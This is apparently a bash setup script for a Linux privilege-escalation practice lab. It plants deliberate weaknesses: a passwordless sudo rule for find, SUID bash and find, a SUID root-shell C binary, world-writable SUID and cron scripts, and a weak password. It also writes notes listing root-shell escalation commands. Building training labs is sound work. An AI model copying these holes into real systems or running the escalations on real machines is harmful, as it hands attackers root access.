#!/bin/bash

echo "[+] Updating system..."


echo "[+] Installing packages..."


echo "[+] Creating lab user..."

useradd -m -s /bin/bash normaluser
echo "normaluser:password123" | chpasswd

echo "[+] Configuring vulnerable sudo rule..."

echo "normaluser ALL=(ALL) NOPASSWD: /usr/bin/find" >> /etc/sudoers

echo "[+] Creating SUID bash..."

cp /bin/bash /usr/local/bin/bash
chown root:root /usr/local/bin/bash
chmod 4755 /usr/local/bin/bash

echo "[+] Creating SUID find..."

cp /usr/bin/find /usr/local/bin/find
chmod 4755 /usr/local/bin/find
chown root:root /usr/local/bin/find

echo "[+] Creating writable SUID script scenario..."

mkdir -p /opt/myapp

cat << 'EOF' > /opt/myapp/cleanup_script.sh
#!/bin/bash
echo "Cleaning old logs..."
rm -rf /tmp/myapp_logs/*
echo "Done."
EOF

chmod 777 /opt/myapp/cleanup_script.sh
chown root:normaluser /opt/myapp/cleanup_script.sh
chmod u+s /opt/myapp/cleanup_script.sh

echo "[+] Creating vulnerable SUID binary..."

cat << 'EOF' > /tmp/privesc.c
#include <unistd.h>
#include <stdlib.h>

int main(){
setuid(0);
setgid(0);
system("/usr/local/bin/bash -p");
return 0;
}
EOF

gcc /tmp/privesc.c -o /usr/local/bin/privesc

chmod 4755 /usr/local/bin/privesc
chown root:root /usr/local/bin/privesc

echo "[+] Creating vulnerable cron job..."

mkdir -p /opt/backup

cat << 'EOF' > /opt/backup/backup.sh
#!/bin/bash
tar -cf /tmp/backup.tar /home
EOF

chmod 777 /opt/backup/backup.sh
chmod +x /opt/backup/backup.sh

echo "* * * * * root /opt/backup/backup.sh" >> /etc/crontab


echo "[+] Creating training notes..."

cat << 'EOF' > /home/normaluser/privesc_notes.txt

Privilege Escalation Enumeration Guide

SUID bash

/usr/local/bin/bash -p

SUID find

/usr/local/bin/find . -exec /bin/bash -p \; -quit

 sudo find

sudo find . -exec /bin/bash -p \; -quit

Writable SUID script

echo "/bin/bash -p" >> /opt/myapp/cleanup_script.sh

Cron job injection

echo "/usr/local/bin/bash -p" >> /opt/backup/backup.sh



EOF

cat << 'EOF' > /home/normaluser/root_normaluserflag.txt
FLG{ESC_HERO}
EOF

chown normaluser:normaluser /home/normaluser/privesc_notes.txt
chown root:root /home/normaluser/root_normaluserflag.txt

chmod 600 /home/normaluser/root_normaluserflag.txt

echo "[+] Enabling cron..."


systemctl enable cron
systemctl start cron

echo -e "\e[33m\e[0m"
echo -e "\e[33m========================================\e[0m"
echo -e "\e[33m      PRIVILEGE ESCALATION LAB READY\e[0m"
echo -e "\e[33m========================================\e[0m"
echo -e "\e[33m\e[0m"
echo -e "\e[33mLogin: via ssh in your host cmd ---- ssh normaluser@<IP>\e[0m"
echo -e "\e[33mUser: normaluser\e[0m"
echo -e "\e[33mPass: password123\e[0m"
echo -e "\e[33mTraining notes located at:\e[0m"
echo -e "\e[33m/home/normaluser/privesc_notes.txt\e[0m"
echo -e "\e[33m\e[0m"
echo -e "\e[33m========================================\e[0m"
